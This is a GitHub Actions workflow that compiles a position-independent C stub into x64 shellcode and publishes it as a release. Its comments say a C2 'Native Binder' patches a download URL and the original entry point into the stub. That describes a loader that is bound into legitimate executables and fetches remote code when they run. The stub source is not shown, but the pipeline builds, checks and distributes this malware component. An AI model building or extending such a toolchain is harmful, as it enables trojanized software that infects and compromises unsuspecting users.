name: Release

# Compiles the position-independent C stub to a flat shellcode blob and publishes
# it to a GitHub Release. C2's "Native Binder" downloads this and patches the URL +
# original-OEP RVA into it at bind time.
#
#   - push to main / manual  -> (re)creates the rolling `preview` release
#   - push of a v* tag        -> creates a versioned release
on:
  push:
    branches: [main]
    tags: ["v*"]
  workflow_dispatch:

permissions:
  contents: write   # gh release create / delete

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install mingw-w64 (x86_64)
        run: sudo apt-get update && sudo apt-get install -y gcc-mingw-w64-x86-64

      - name: Compile stub (freestanding, position-independent, both entry modes)
        run: |
          # One object per entry-point mode → two distinct flat .bin files.
          for MODE in exe dll; do
            FLAG="BUILD_FOR_$(echo "$MODE" | tr 'a-z' 'A-Z')"
            x86_64-w64-mingw32-gcc -c -O2 -ffreestanding -nostdlib -fno-stack-protector \
                  -fno-asynchronous-unwind-tables -fno-unwind-tables \
                  -D"$FLAG" -e _start stub/stub.c -o "stub-$MODE.o"
          done

      - name: Relocations (should be PC-relative only — verifies PIC)
        run: |
          for MODE in exe dll; do
            echo "=== stub-$MODE.o ==="
            x86_64-w64-mingw32-objdump -r "stub-$MODE.o" || true
          done

      - name: Link to flat PIC binary (produces stub-x64-exe.bin + stub-x64-dll.bin)
        run: |
          mkdir -p dist
          for MODE in exe dll; do
            x86_64-w64-mingw32-ld -T stub/stub.ld --entry=_start -o "stub-$MODE.pe" "stub-$MODE.o"
            x86_64-w64-mingw32-objcopy -O binary "stub-$MODE.pe" "dist/stub-x64-$MODE.bin"
          done
          ls -la dist
          # The binder patcher locates these markers in each flat binary — there must be exactly one of each.
          for f in dist/stub-x64-exe.bin dist/stub-x64-dll.bin; do
            test "$(grep -a -c SHELLCODE_URL_PLACEHOLDER "$f")" = "1" || { echo "FAIL ($f): URL marker missing/duplicated"; exit 1; }
            test "$(grep -a -c C2OEPRAV "$f")" = "1" || { echo "FAIL ($f): OEP marker missing/duplicated"; exit 1; }
          done

      - uses: actions/upload-artifact@v4
        with:
          name: stub-x64
          path: dist/stub-x64-*.bin

  publish:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: stub-x64
          path: dist

      - name: Publish release
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          ls -la dist
          if [[ "$GITHUB_REF" == refs/tags/* ]]; then
            TAG="${GITHUB_REF#refs/tags/}"
            gh release create "$TAG" dist/* --title "$TAG" --notes "Native loader stub $TAG" --repo "$GITHUB_REPOSITORY"
          else
            gh release delete preview --cleanup-tag --yes --repo "$GITHUB_REPOSITORY" 2>/dev/null || true
            gh release create preview dist/* --title "Preview" --prerelease --target "$GITHUB_SHA" \
              --notes "Rolling build of the native loader stub ($GITHUB_SHA)." --repo "$GITHUB_REPOSITORY"
          fi
